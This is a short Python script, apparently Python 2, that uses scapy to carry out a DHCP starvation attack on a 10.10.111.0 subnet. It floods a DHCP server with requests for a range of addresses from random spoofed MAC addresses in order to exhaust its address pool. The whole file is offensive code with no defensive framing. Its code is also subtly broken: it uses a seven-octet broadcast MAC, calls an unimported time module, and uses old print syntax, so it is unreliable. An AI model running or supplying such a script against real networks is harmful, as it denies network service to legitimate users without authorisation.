import sys
import os
from scapy.all import*

def main():
  physicalAddress = "ff:ff:ff:ff:ff:ff:ff"
  ipAddr = False

  startAddress = "10.10.111."

  def starve():
      for ip in range(100,201):
          for i in range (0,8):
              macAddress = RandMAC()
              req = Ether(src = macAddress , dst = physicalAddress)
              req /= IP(src   = "0.0.0.0" ,dst = "255.255.255.255")
              req  /= UDP(sport = 68 , dport = 67)
              req /= BOOTP(chaddr = macAddress)
              req /= DHCP(options = [("message-type", "request"), ("server_id", "10.10.111.1"),     ("requested_addr", startAddress + str(ip)),"end"])
              sendp(req)
              print "Requesting :" + startAddress + str(ip) + "\n"
              time.sleep(1)


  starve()

if __name__ == "__main__":
    main()
